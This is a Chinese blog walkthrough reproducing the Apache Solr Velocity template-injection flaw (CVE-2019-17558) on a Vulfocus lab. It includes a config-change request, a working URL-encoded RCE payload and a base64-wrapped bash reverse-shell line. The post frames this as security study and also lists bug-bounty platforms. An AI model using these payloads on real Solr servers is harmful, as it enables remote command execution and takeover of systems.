# 原创
：  【漏洞复现-solr-命令执行】vulfocus/solr-cve_2019_17558

# 【漏洞复现-solr-命令执行】vulfocus/solr-cve_2019_17558

   <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）寻找模板（接口、配置文件）的命令执行漏洞（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|命令、代码执行博文|目标|状态
|[【漏洞复现-jupyter_notebook-命令执行】vulfocus/jupyter_notebook-cve_2019_9644](https://blog.csdn.net/qq_53079406/article/details/127491074)|发现功能点上的命令执行|已发布
|[【漏洞复现-solr-命令执行】vulfocus/solr-cve_2019_17558](https://blog.csdn.net/qq_53079406/article/details/127332723)|寻找模板（接口、配置文件）的命令执行漏洞|已发布
|[【漏洞复现-seaCms-命令执行】vulfocus/seacms-cnvd_2020_22721](https://blog.csdn.net/qq_53079406/article/details/127329791)|写入可执行文件|已发布
|[【漏洞复现-maccms-命令执行】vulfocus/maccms-cve_2017_17733](https://blog.csdn.net/qq_53079406/article/details/127328882)|参数中写入命令（加密）|已发布
|[【漏洞复现-webmin-命令执行】vulfocus/webmin-cve_2019_15107](https://blog.csdn.net/qq_53079406/article/details/127326071)|拼接执行命令|已发布
|[【漏洞复现-thinkphp-命令执行】vulfocus/thinkphp-3.2.x](https://blog.csdn.net/qq_53079406/article/details/127324775)|写入错误日志中|已发布
|[【漏洞复现-Discuz-代码执行】Discuz_CVE-2019-13956](https://blog.csdn.net/qq_53079406/article/details/127305443)|cookie中植入|已发布
|[【漏洞复现-骑士cms-代码执行】vulfocus/骑士cms_cve_2020_35339](https://blog.csdn.net/qq_53079406/article/details/127301708)|后台配置中植入命令|已发布
|更多复现漏洞将公布，敬请期待|——|——
</tbody></table>


---


**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)
123.58.224.8:28378
<img alt="" height="603" src="https://img-blog.csdnimg.cn/23a618fdc0e84ac7b640c076580a1342.png" width="899"/>​

 <img alt="" height="899" src="https://img-blog.csdnimg.cn/8e89a2d93e644857838126eb12d71ecd.png" width="1200"/>​



> 
<h3>1.2、知识:</h3>
1、API接口信息，配置文件


> 
<h3>1.3、描述：</h3>
Apache Solr 5.0.0版本至8.3.1版本中存在输入验证错误漏洞。
攻击者可借助自定义的Velocity模板功能，利用Velocity-SSTI漏洞在Solr系统上执行任意代码。


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
第一步：
访问特定url启用配置params.resource.loader.enabled，其中API路径包含core名称
访问
/solr/admin/cores?indexInfo=false&amp;wt=json
<img alt="" height="553" src="https://img-blog.csdnimg.cn/984b6925a2e04a74a1a0ddb71ad17beb.png" width="1185"/>​

<hr/>
第二步：
启用配置 params.resource.loader.enabled 为true
在url访问/solr/demo/config，bp抓包 改成POST然后修改启动配置
<img alt="" height="591" src="https://img-blog.csdnimg.cn/f1a5300fb374459e9957d15e38588303.png" width="1200"/>​
修改一：
改为POST请求
修改二：

<pre><code>{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}</code></pre>


<img alt="" height="716" src="https://img-blog.csdnimg.cn/b240cdd868274a429821eb7ec9166f4f.png" width="1200"/>​
<img alt="" height="287" src="https://img-blog.csdnimg.cn/1d19e4c3c3a9456380d7c9f5eab001c0.png" width="1168"/>​
<hr/>
第三步：
注入Velocity模板即可执行任意命令
POC：

<pre>`/solr/demo/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27ls%20/tmp%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end`</pre>

URL中插入命令
<img alt="" height="576" src="https://img-blog.csdnimg.cn/be2977b317174353913662c04d0c8142.png" width="1200"/>​

<img alt="" height="316" src="https://img-blog.csdnimg.cn/1f872ef9736b47abb9d2ce3d8d7aa642.png" width="1200"/>​
<hr/>
扩展：
使用bash来反弹shell【但Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法】
需要进行一次base64编码绕过
bash -i &gt;&amp; /dev/tcp/ip/port  0&gt;&amp;1
%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8+ip/port的base64编码+IDA%2BJjE%3D
组合
bash%20-c%20{echo**%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8+ip/port的base64编码+IDA%2BJjE%3D**}|{base64%2C-d}|{bash%2C-i}


---


---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

